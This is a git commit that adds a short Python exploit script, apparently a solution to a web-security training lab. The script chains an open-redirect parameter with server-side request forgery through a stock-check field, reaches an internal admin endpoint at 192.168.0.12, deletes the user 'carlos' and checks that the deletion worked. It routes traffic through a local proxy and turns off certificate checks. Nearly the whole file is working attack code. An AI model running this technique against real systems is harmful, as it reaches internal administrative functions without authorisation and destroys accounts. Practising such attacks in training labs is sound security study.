3a48d37ac63d4e9921700efd7f33f3dfdc43a54d
FENIL SHAH <56188454+Th3lazykid@users.noreply.github.com>
2021-10-17 11:48:53 +0530

    Create SSRF-lab5.py

---
+++ Python/SSRF-lab5.py
@@ -0,0 +1,37 @@
+import requests
+import sys
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+def delete_user(url):
+    payload = '/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos'
+    check_stock_path = "/product/stock"
+    params = {'stockApi': payload}
+    r = requests.post(url + check_stock_path, proxies=proxies, data=params, verify=False)
+
+    #checking if the user carlos got deleted
+    payload2 = '/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/'
+    params2 = {'stockApi': payload2}
+    r = requests.post(url + check_stock_path, data=params2, proxies=proxies, verify=False)
+    if 'Carlos' not in r.text:
+        print("You successfully deleted the user carlos, GG")
+    else:
+        print("The exploit failed miserably")
+
+
+def main():
+    if len(sys.argv) !=2:
+        print("(+) Usage %s <url>" % sys.argv[0])
+        print("(+) Example: %s Th3lazykid.gitbook.io" % sys.argv[0])
+        sys.exit[-1]
+
+    url = sys.argv[1]
+    print("(+) Deleting carlos user...")
+    delete_user(url)
+
+
+if __name__ == "__main__":
+    main()
